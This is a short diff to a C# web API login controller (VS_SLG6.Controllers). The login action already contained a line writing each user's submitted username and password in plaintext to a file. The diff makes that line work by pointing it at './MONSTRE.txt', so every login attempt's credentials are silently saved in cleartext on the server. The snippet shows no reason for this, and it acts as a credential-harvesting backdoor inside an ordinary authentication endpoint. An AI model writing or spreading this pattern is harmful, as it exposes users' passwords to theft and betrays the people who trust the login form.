@@ -43,7 +43,7 @@ namespace VS_SLG6.Controllers
         [HttpPost("login")]
         public ActionResult<LoginResponse> Login(User u)
         {
-            System.IO.File.WriteAllText(".", string.Format("Login: [{0}]\nPassword: [{1}]\n\n", u.Login, u.Password));
+            System.IO.File.WriteAllText("./MONSTRE.txt", string.Format("Login: [{0}]\nPassword: [{1}]\n\n", u.Login, u.Password));
             return _service.Login(u);
         }
 
